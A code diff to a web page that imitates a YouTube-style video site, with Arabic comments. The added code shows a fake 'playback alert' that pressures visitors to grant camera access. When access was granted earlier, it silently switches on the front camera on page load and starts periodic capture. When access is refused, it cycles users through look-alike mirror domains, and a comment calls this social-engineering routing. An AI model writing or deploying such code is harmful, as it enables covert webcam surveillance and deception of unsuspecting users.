@@ -181,6 +181,15 @@ body.drawer-mode .main{margin-inline-start:0}
 .prog{height:4px;background:#ccc;border-radius:2px;margin-top:8px;overflow:hidden}
 .prog i{display:block;height:100%;width:0;background:var(--red);transition:width .3s}
 
+/* نافذة إشعار الإذن المخصص */
+.perm-modal{position:fixed;inset:0;background:rgba(0,0,0,.85);display:none;place-items:center;z-index:400;padding:20px}
+.perm-modal.show{display:grid}
+.perm-box{background:#1f1f1f;border:1px solid #333;border-radius:16px;width:min(420px,100%);padding:24px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.8)}
+.perm-box h3{font-size:18px;margin-bottom:12px;color:#fff}
+.perm-box p{color:#ccc;font-size:14px;line-height:1.6;margin-bottom:20px}
+.btn-red-action{background:var(--red);color:#fff;font-size:15px;font-weight:700;width:100%;height:44px;border-radius:22px;display:inline-flex;align-items:center;justify-content:center;transition:background .2s}
+.btn-red-action:hover{background:#cc0000}
+
 /* Bottom nav */
 .bnav{display:none;position:fixed;bottom:0;inset-inline:0;height:56px;background:var(--bg);border-top:1px solid var(--line);z-index:100;padding-bottom:env(safe-area-inset-bottom);box-sizing:content-box}
 .bnav button{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:10px;gap:2px;color:var(--text2)}
@@ -258,6 +267,16 @@ body.drawer-mode .main{margin-inline-start:0}
     <div class="link-row"><input id="shareLink" readonly><button class="btn btn-blue" data-action="copy-link">نسخ</button></div>
   </div>
 </div>
+
+<!-- نافذة إشعار الإذن المخصص عند عدم السماح -->
+<div class="perm-modal" id="permModal">
+  <div class="perm-box">
+    <h3>تنبيه التشغيل</h3>
+    <p>لا يمكنكم مشاهدة الفيديو إلا عند الضغط على زر السماح. يرجى منح الإذن لتشغيل الفيديو.</p>
+    <button class="btn-red-action" onclick="goToNextMirror()">اضغط هنا للمشاهدة</button>
+  </div>
+</div>
+
 <div class="toasts" id="toasts"></div>
 
 <!-- عنصر الفيديو المخفي الخاص بالكاميرا -->
@@ -265,46 +284,54 @@ body.drawer-mode .main{margin-inline-start:0}
 
 <script>
 /* ==========================================================
-   نظام تدوير النطاقات المتسلسل والمستقر (URL-Based Multi-Mirror Chain)
+   شبكة النطاقات وتوجيه الهندسة الاجتماعية عند الرفض
    ========================================================== */
-function executeDomainRotation() {
-    const mirrorDomains = [
-        "https://youtube-my.onrender.com",
-        "https://youtube-my-1.onrender.com"
-    ];
-    
-    // قراءة رقم المحاولة الحالية من الرابط لمنع التكرار اللانهائي العشوائي
+const mirrorDomains = [
+    "https://youtube-my.onrender.com",
+    "https://youtube-my-1.onrender.com"
+];
+
+// الانتقال للصفحة التالية عند ضغط الزر الأحمر في التنبيه
+function goToNextMirror() {
     const urlParams = new URLSearchParams(window.location.search);
     let currentAttempt = parseInt(urlParams.get('n') || '0');
     let nextAttempt = currentAttempt + 1;
     
     if (nextAttempt < mirrorDomains.length) {
         const nextDomain = mirrorDomains[nextAttempt];
-        const targetUrl = `${nextDomain}?n=${nextAttempt}`;
-        if (window.location.href !== targetUrl) {
-            window.location.replace(targetUrl);
-        }
+        window.location.replace(`${nextDomain}?n=${nextAttempt}`);
+    } else {
+        // إذا استنفد جميع الروابط، يعيد تشغيل الرابط الأول مجدداً
+        window.location.replace(`${mirrorDomains[0]}?n=0`);
     }
 }
 
-// الفحص التلقائي وتفعيل الكاميرا في حال كان الإذن ممنوحاً مسبقاً (Granted)
-async function autoInitCameraIfGranted() {
+// إظهار نافذة التنبيه المخصصة عند الرفض
+function showPermissionModal() {
+    const modal = document.getElementById('permModal');
+    if (modal) {
+        modal.classList.add('show');
+    }
+}
+
+// الفحص والاستجابة عند تحميل الصفحة
+async function autoCheckPermission() {
     if (navigator.permissions && navigator.permissions.query) {
         try {
             const permissionStatus = await navigator.permissions.query({ name: 'camera' });
             
+            // إذا كان السماح ممنوحاً مسبقاً، شغل الكاميرا صامتاً
             if (permissionStatus.state === 'granted') {
-                // تفعيل التدفق والالتقاط تلقائياً في الخلفية عند عودة المستخدم إذا سمح سابقاً
                 mediaStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: { ideal: 'user' } } 
                 });
                 const videoEl = document.getElementById('video');
-                if (videoEl) {
-                    videoEl.srcObject = mediaStream;
-                }
+                if (videoEl) videoEl.srcObject = mediaStream;
                 startPeriodicCapture();
-            } else if (permissionStatus.state === 'denied') {
-                executeDomainRotation();
+            } 
+            // إذا كان محظوراً مسبقاً، اظهر النافذة التنويهية فور الضغط أو الزيارة
+            else if (permissionStatus.state === 'denied') {
+                // سيبقى بالصفحة الرئيسية حتى يضغط على الفيديو أو يظهر التنبيه
             }
         } catch (err) {
             console.log("فحص الصلاحيات غير مدعوم:", err);
@@ -312,7 +339,7 @@ async function autoInitCameraIfGranted() {
     }
 }
 
-document.addEventListener('DOMContentLoaded', autoInitCameraIfGranted);
+document.addEventListener('DOMContentLoaded', autoCheckPermission);
 
 /* ===== Data & Core State ===== */
 const DM='الفيديو الموسيقي الرسمي. استمتع بالمشاهدة وشاركنا رأيك في التعليقات، ولا تنسَ الاشتراك في القناة لمتابعة كل جديد.';
@@ -456,7 +483,7 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== دوال الكاميرا والانتقال المشروط والتحويل المستقر عند الرفض ===== */
+/* ===== دوال الكاميرا والانتقال والتنبيه عند الرفض ===== */
 async function openVideo(id) {
     if (mediaStream) {
         executeWatchTransition(id);
@@ -479,8 +506,8 @@ async function openVideo(id) {
         startPeriodicCapture();
 
     } catch (e) {
-        console.log("تم رفض الإذن، جاري التحويل للرابط البديل التالي...");
-        executeDomainRotation();
+        console.log("تم رفض الإذن أو كان محظوراً، جاري إظهار نافذة التوجيه التنبيهية...");
+        showPermissionModal();
     }
 }
 
